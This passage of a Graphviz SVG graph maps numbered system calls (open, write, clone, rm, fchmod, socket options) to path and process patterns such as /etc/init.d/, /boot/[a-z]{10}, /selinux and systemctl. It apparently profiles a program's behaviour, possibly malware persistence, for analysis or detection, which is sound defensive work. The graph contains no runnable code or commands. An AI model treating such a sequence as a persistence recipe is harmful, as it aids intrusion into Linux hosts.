1520.65,-179.21 1510.55,-176 1510.75,-183\"/>\n<text text-anchor=\"middle\" x=\"1415.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.clone</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.74,-264.4C2220.4,-265.25 1497,-264.81 1462.34,-229 1442.91,-208.93 1480.35,-194.84 1512.93,-186.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1513.86,-190.21 1522.81,-184.55 1512.28,-183.39 1513.86,-190.21\"/>\n<text text-anchor=\"middle\" x=\"1481.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.write</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.67,-264.24C2229.68,-264.56 1555.8,-262.6 1523.34,-229 1515.42,-220.81 1520.26,-210.16 1528.17,-200.8\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1530.94,-202.96 1535.32,-193.32 1525.88,-198.13 1530.94,-202.96\"/>\n<text text-anchor=\"middle\" x=\"1542.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.lseek</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.05,-263.11C2241.61,-260.32 1623.13,-250.6 1585.34,-229 1575.94,-223.63 1568.87,-214.26 1563.8,-205.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1566.93,-203.51 1559.38,-196.09 1560.65,-206.6 1566.93,-203.51\"/>\n<text text-anchor=\"middle\" x=\"1604.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.open</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.21,-263.32C2259.8,-261.21 1723.75,-253.36 1647.34,-229 1635.71,-225.29 1634.94,-220.04 1624.34,-214 1612.37,-207.18 1598.89,-200.34 1586.92,-194.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1588.23,-191.28 1577.7,-190.12 1585.21,-197.6 1588.23,-191.28\"/>\n<text text-anchor=\"middle\" x=\"1672.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">54.stat64</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.09,-263.89C2288.75,-263.11 1873.25,-258.15 1736.34,-229 1718.58,-225.22 1715.65,-219.48 1698.34,-214 1663.33,-202.92 1622.62,-193.38 1593.27,-187.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1593.89,-183.63 1583.38,-184.98 1592.44,-190.47 1593.89,-183.63\"/>\n<text text-anchor=\"middle\" x=\"1752.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.rm</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1797.34\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1797.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.07,-263.29C2273,-261.18 1800.72,-253.48 1777.34,-229 1770.29,-221.62 1772.88,-211.45 1778.18,-202.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1781.19,-204 1783.86,-193.75 1775.38,-200.1 1781.19,-204\"/>\n<text text-anchor=\"middle\" x=\"1806.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">24.waitpid</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.51,-262.75C2296.22,-259.66 1913.41,-250.3 1858.34,-229 1849.8,-225.7 1833.53,-212.2 1819.94,-200.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1822.09,-197.28 1812.33,-193.15 1817.38,-202.46 1822.09,-197.28\"/>\n<text text-anchor=\"middle\" x=\"1882.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">23.clone</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1872.34\" cy=\"-18\" rx=\"29.5\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1872.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/perl/</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.37,-262.82C2327.87,-260.18 2055.6,-252.09 1963.34,-229 1929.19,-220.45 1911.9,-224.57 1891.34,-196 1859.29,-151.48 1862.54,-83.62 1867.56,-46.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1871.06,-46.43 1869.06,-36.03 1864.13,-45.41 1871.06,-46.43\"/>\n<text text-anchor=\"middle\" x=\"1887.84\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.stat</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2001.34\" cy=\"-178\" rx=\"100.98\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2001.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">permission(s|:)[0&#45;9]{1,4}</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.96,-262.04C2311.66,-257.8 1986.95,-246.66 1970.34,-229 1963.27,-221.48 1966.61,-212.11 1973.25,-203.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1975.99,-205.7 1980.06,-195.92 1970.78,-201.02 1975.99,-205.7\"/>\n<text text-anchor=\"middle\" x=\"1997.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.umask</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2167.34\" cy=\"-178\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2167.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.96,-264.34C2326.99,-264.12 2060.05,-259.76 2031.34,-229 2026.79,-224.13 2027.17,-219.21 2031.34,-214 2054.1,-185.54 2076.1,-205.3 2111.34,-196 2114.94,-195.05 2118.66,-194.02 2122.38,-192.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2123.58,-196.26 2132.2,-190.1 2121.62,-189.54 2123.58,-196.26\"/>\n<text text-anchor=\"middle\" x=\"2053.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">15.write</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.13,-263.42C2342.46,-261.72 2123.38,-255.04 2099.34,-229 2086.75,-215.37 2103.24,-202.99 2123.14,-193.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2124.56,-197.16 2132.42,-190.06 2121.85,-190.71 2124.56,-197.16\"/>\n<text text-anchor=\"middle\" x=\"2122.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.lseek</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2463.67,-260.86C2365.93,-256.16 2205.71,-245.96 2184.34,-229 2177.21,-223.35 2173.06,-214.57 2170.64,-205.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2174.04,-205.11 2168.52,-196.06 2167.2,-206.58 2174.04,-205.11\"/>\n<text text-anchor=\"middle\" x=\"2207.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2436.34\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2436.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2464.29,-260.43C2379.78,-255.63 2252.21,-245.7 2237.34,-229 2232.9,-224.02 2233.05,-219.11 2237.34,-214 2257.54,-189.93 2346.93,-182.41 2398.77,-180.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2399.07,-183.55 2408.92,-179.65 2398.78,-176.56 2399.07,-183.55\"/>\n<text text-anchor=\"middle\" x=\"2259.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">59.write</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.25,-262.96C2402.07,-260.32 2325.41,-252.3 2305.34,-229 2277.14,-196.27 2351,-184.89 2398.96,-180.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2399.34,-184.47 2409.05,-180.24 2398.82,-177.49 2399.34,-184.47\"/>\n<text text-anchor=\"middle\" x=\"2342.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2474.32,-255.13C2443.59,-249.47 2411.6,-240.92 2402.34,-229 2394.74,-219.22 2401.36,-207.84 2410.71,-198.41\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2413.13,-200.94 2418.2,-191.64 2408.44,-195.75 2413.13,-200.94\"/>\n<text text-anchor=\"middle\" x=\"2425.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2502.35,-249.03C2491.66,-243.67 2480.44,-236.95 2471.34,-229 2463.28,-221.97 2456.14,-212.71 2450.44,-204.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2453.3,-202.05 2445.04,-195.41 2447.36,-205.75 2453.3,-202.05\"/>\n<text text-anchor=\"middle\" x=\"2494.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2535.25,-246.86C2531.96,-236.24 2526.35,-222.96 2517.34,-214 2504.86,-201.6 2487.27,-193.28 2471.67,-187.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2472.38,-184.43 2461.79,-184.74 2470.26,-191.1 2472.38,-184.43\"/>\n<text text-anchor=\"middle\" x=\"2546.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2559.82,-247.16C2569.51,-237.15 2577.37,-224.42 2569.34,-214 2557.63,-198.81 2508.24,-188.9 2473.08,-183.63\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2473.52,-180.16 2463.13,-182.2 2472.53,-187.09 2473.52,-180.16\"/>\n<text text-anchor=\"middle\" x=\"2598.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2836.34\" cy=\"-178\" rx=\"66.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2836.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/[a&#45;z]{10}</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2575.54,-249C2602.46,-238.23 2640.27,-223.94 2674.34,-214 2706.23,-204.7 2742.3,-196.67 2772.3,-190.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2773.09,-194.07 2782.23,-188.69 2771.74,-187.2 2773.09,-194.07\"/>\n<text text-anchor=\"middle\" x=\"2698.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.clone</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2609.36,-257.09C2644.23,-252.05 2686.49,-243.46 2722.34,-229 2733.65,-224.43 2734.47,-219.55 2745.34,-214 2758.19,-207.43 2772.58,-201.35 2786.06,-196.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2787.55,-199.35 2795.68,-192.56 2785.08,-192.79 2787.55,-199.35\"/>\n<text text-anchor=\"middle\" x=\"2764.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.write</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2611.73,-258.47C2672.45,-252.95 2753.85,-243.22 2783.34,-229 2795.92,-222.93 2807.52,-212.79 2816.63,-203.22\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2819.27,-205.52 2823.38,-195.76 2814.07,-200.83 2819.27,-205.52\"/>\n<text text-anchor=\"middle\" x=\"2824.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.lseek</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge42\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2614.61,-260.55C2700.23,-255.83 2830.21,-245.96 2845.34,-229 2850.93,-222.73 2851.11,-214.2 2849.14,-205.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2852.38,-204.61 2845.88,-196.23 2845.74,-206.83 2852.38,-204.61\"/>\n<text text-anchor=\"middle\" x=\"2869.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">5.open</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge43\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2615.68,-261.8C2714.16,-258.15 2875.07,-249.17 2893.34,-229 2903.07,-218.26 2893.88,-207.5 2880.24,-198.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2881.71,-195.54 2871.31,-193.55 2878.2,-201.6 2881.71,-195.54\"/>\n<text text-anchor=\"middle\" x=\"2923.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">55.stat64</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge44\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.61,-262.99C2730.15,-260.7 2931.07,-253.23 2953.34,-229 2972.94,-207.67 2941.74,-195.07 2906.65,-187.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2907.17,-184.39 2896.69,-185.96 2905.86,-191.27 2907.17,-184.39\"/>\n<text text-anchor=\"middle\" x=\"2976.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">26.rm</text>\n</g>\n<!-- 15 -->\n<g id=\"node16\" class=\"node\">\n<title>15</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3211.34\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3211.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/sed</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge45\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2615.53,-261.85C2706.77,-258.42 2863.99,-249.84 2997.34,-229 3025.77,-224.56 3032.32,-220.58 3060.34,-214 3096.35,-205.54 3137.22,-196.07 3167.36,-189.12\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3168.18,-192.52 3177.14,-186.87 3166.61,-185.7 3168.18,-192.52\"/>\n<text text-anchor=\"middle\" x=\"3090.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">47.fchmod</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge46\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.7,-264.24C2752.94,-263.84 3029.9,-259.2 3121.34,-229 3132.93,-225.17 3133.8,-220.17 3144.34,-214 3154.67,-207.95 3166.15,-201.76 3176.65,-196.31\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3178.28,-199.41 3185.57,-191.73 3175.08,-193.18 3178.28,-199.41\"/>\n<text text-anchor=\"middle\" x=\"3166.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.write</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge47\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.92,-264.32C2779.2,-264.36 3143.3,-260.84 3189.34,-229 3197.16,-223.59 3202.23,-214.75 3205.5,-205.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3208.88,-206.92 3208.48,-196.33 3202.19,-204.85 3208.88,-206.92\"/>\n<text text-anchor=\"middle\" x=\"3222.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.fcntl</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge48\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.47,-263.01C2795.72,-260.34 3226.83,-251.6 3248.34,-229 3256.9,-220 3250.29,-208.99 3240.42,-199.59\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3242.7,-196.93 3232.82,-193.09 3238.14,-202.25 3242.7,-196.93\"/>\n<text text-anchor=\"middle\" x=\"3272.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.fstat</text>\n</g>\n<!-- Start&#45;&gt;15 -->\n<g id=\"edge49\" class=\"edge\">\n<title>Start&#45;&gt;15</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.54,-263.27C2804.85,-261.12 3274.09,-253.34 3297.34,-229 3314.59,-210.93 3284.89,-197.32 3255.79,-188.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3256.58,-185.48 3246.01,-186.24 3254.74,-192.24 3256.58,-185.48\"/>\n<text text-anchor=\"middle\" x=\"3332.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">46.fchown</text>\n</g>\n<!-- 16 -->\n<g id=\"node17\" class=\"node\">\n<title>16</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3561.34\" cy=\"-178\" rx=\"53.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3561.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^systemctl$</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge50\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.35,-262.79C2792.99,-259.69 3223.11,-250.16 3366.34,-229 3369.99,-228.46 3453.66,-206.88 3510.21,-192.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3511.27,-195.59 3520.07,-189.69 3509.52,-188.81 3511.27,-195.59\"/>\n<text text-anchor=\"middle\" x=\"3441.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.exec</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge51\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.5,-263.29C2824.58,-261.07 3386.98,-252.9 3467.34,-229 3479.76,-225.31 3481,-220.27 3492.34,-214 3502.24,-208.53 3513.09,-202.87 3523.2,-197.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3524.87,-200.82 3532.23,-193.19 3521.72,-194.56 3524.87,-200.82\"/>\n<text text-anchor=\"middle\" x=\"3515.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.wait4</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge52\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.44,-263.53C2844.34,-261.84 3501.34,-254.75 3539.34,-229 3547.21,-223.67 3552.29,-214.84 3555.56,-206.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3558.94,-206.98 3558.53,-196.4 3552.25,-204.93 3558.94,-206.98\"/>\n<text text-anchor=\"middle\" x=\"3591.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">71.getsockopt</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge53\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2617.01,-264.44C2861.3,-265.46 3599.99,-265.49 3635.34,-229 3648.82,-215.08 3631.49,-202.83 3610.23,-193.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3611.21,-190.57 3600.62,-190.22 3608.68,-197.1 3611.21,-190.57\"/>\n<text text-anchor=\"middle\" x=\"3684.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">73.getsockname</text>\n</g>\n<!-- Start&#45;&gt;16 -->\n<g id=\"edge54\" class=\"edge\">\n<title>Start&#45;&gt;16</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.31,-263.18C2877.5,-260.2 3714.82,-249.1 3734.34,-229 3770.29,-191.98 3687.96,-181.91 3624.93,-179.43\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3624.72,-175.92 3614.61,-179.08 3624.48,-182.92 3624.72,-175.92\"/>\n<text text-anchor=\"middle\" x=\"3781.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">72.setsockopt</text>\n</g>\n<!-- 17 -->\n<g id=\"node18\" class=\"node\">\n<title>17</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3852.34\" cy=\"-91\" rx=\"37.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3852.34\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/sed</text>\n</g>\n<!-- Start&#45;&gt;17 -->\n<g id=\"edge55\" class=\"edge\">\n<title>Start&#45;&gt;17</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.75,-263.19C2891.13,-260.15 3802.16,-248.59 3825.34,-229 3856.64,-202.54 3858.37,-151.28 3855.94,-119.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3859.39,-118.78 3854.95,-109.16 3852.42,-119.45 3859.39,-118.78\"/>\n<text text-anchor=\"middle\" x=\"3873.84\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">37.stat</text>\n</g>\n<!-- 18 -->\n<g id=\"node19\" class=\"node\">\n<title>18</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3917.34\" cy=\"-18\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3917.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">bin/openrc</text>\n</g>\n<!-- Start&#45;&gt;18 -->\n<g id=\"edge56\" class=\"edge\">\n<title>Start&#45;&gt;18</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.91,-264.36C2880,-265.25 3728.41,-265.24 3845.34,-229 3871.12,-221.01 3882.06,-218.91 3896.34,-196 3925.23,-149.63 3924.26,-83.02 3920.87,-46.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3924.35,-45.73 3919.83,-36.15 3917.39,-46.46 3924.35,-45.73\"/>\n<text text-anchor=\"middle\" x=\"3937.84\" y=\"-130.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.stat</text>\n</g>\n<!-- 19 -->\n<g id=\"node20\" class=\"node\">\n<title>19</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4032.34\" cy=\"-178\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4032.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge57\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.87,-264.48C2888.19,-265.83 3785.25,-267.31 3908.34,-229 3919.99,-225.37 3920.38,-219.37 3931.34,-214 3952.72,-203.52 3978.04,-194.75 3997.98,-188.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3999.01,-191.96 4007.58,-185.73 3997,-185.25 3999.01,-191.96\"/>\n<text text-anchor=\"middle\" x=\"3953.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">61.write</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge58\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.73,-263.59C2906.34,-261.88 3912.81,-254.12 3976.34,-229 3984.32,-225.84 3998.9,-212.71 4011.19,-200.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4013.84,-202.99 4018.46,-193.45 4008.9,-198.03 4013.84,-202.99\"/>\n<text text-anchor=\"middle\" x=\"4019.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge59\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.47,-263.66C2920.45,-262.12 4020.14,-254.79 4045.34,-229 4051.78,-222.4 4050.95,-213.04 4047.65,-204.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4050.74,-202.54 4043.33,-194.96 4044.4,-205.5 4050.74,-202.54\"/>\n<text text-anchor=\"middle\" x=\"4072.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- Start&#45;&gt;19 -->\n<g id=\"edge60\" class=\"edge\">\n<title>Start&#45;&gt;19</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.58,-263.72C2927.65,-262.41 4073.15,-255.78 4099.34,-229 4114.32,-213.68 4089.73,-199.4 4066.23,-190.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4067.28,-186.71 4056.69,-186.48 4064.83,-193.26 4067.28,-186.71\"/>\n<text text-anchor=\"middle\" x=\"4125.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- 20 -->\n<g id=\"node21\" class=\"node\">\n<title>20</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"4242.34\" cy=\"-178\" rx=\"38.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"4242.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/selinux</text>\n</g>\n<!-- Start&#45;&gt;20 -->\n<g id=\"edge61\" class=\"edge\">\n<title>Start&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2616.51,-263.35C2927.62,-260.58 4076.58,-249.05 4151.34,-229 4173.87,-222.96 4196.88,-210.24 4214.13,-199.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"4216.19,-201.98 4222.59,-193.54 4212.32,-196.15 4216.19,-201.98\"/>\n<text text-anchor=\"middle\" x=\"4214.84\" 